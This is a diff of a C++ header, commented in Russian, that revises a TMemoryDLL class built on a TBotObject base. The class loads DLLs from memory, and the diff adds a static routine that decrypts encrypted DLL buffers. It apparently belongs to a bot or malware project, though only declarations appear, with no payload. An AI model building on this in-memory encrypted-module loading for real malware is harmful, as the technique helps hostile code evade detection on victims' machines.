@@ -87,26 +87,35 @@ class TMemoryDLL : public TBotObject
 {
 private:
 	HMEMORYMODULE FHandle;
-	DWORD  FSize;
-	LPVOID FSourceBuffer;
 public:
-	// параметр DuplicateBuffer касается только библиотек в шифрованном
-	// формате. Если указать true то расшифрованный буфер будет
-	// храниться на протяжении всей жизни класса
-	TMemoryDLL(const void* DllBuf, bool DuplicateBuffer = false);
+	TMemoryDLL(const void* DllBuf);
 	~TMemoryDLL();
 
-	DWORD         inline Size()           { return FSize; }       // Размер библиотеки
-	LPVOID        inline SourceBuffer()   { return FSourceBuffer; } // Указатель на исходный буфер DLL
-
 	HMEMORYMODULE inline Handle() { return FHandle; }
-	bool		  IsTrue() { return FHandle != NULL; } //true если dll инициализирована
+	bool		  IsTrue()        { return FHandle != NULL; } //true если dll инициализирована
 
 	LPVOID        GetProcAddress(const char*   Name);
 	LPVOID inline GetProcAddress(const string& Name) { return GetProcAddress(Name.t_str()); }
 	bool          GetProcAddress(const char*   Name, LPVOID &Addr);
 	bool   inline GetProcAddress(const string& Name, LPVOID &Addr) { return GetProcAddress(Name.t_str(), Addr); }
+
+	//---------------------------------------------------------
+	//  Функция расшифровывает длл
+	//
+	//  DllBuf - Указатель на исходный буфер длл
+	//
+	//  Выходные параметры:
+	//
+	//  DllSize - размер расшифрованной длл
+	//  NewBuf  - Указатель на буфер длл
+	//  NewBufAllocated - Установится в истину, если
+	//                    для буфера пришлось выделить память
+	//---------------------------------------------------------
+	bool   static DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated);
 };
+
+
+
 
 
 
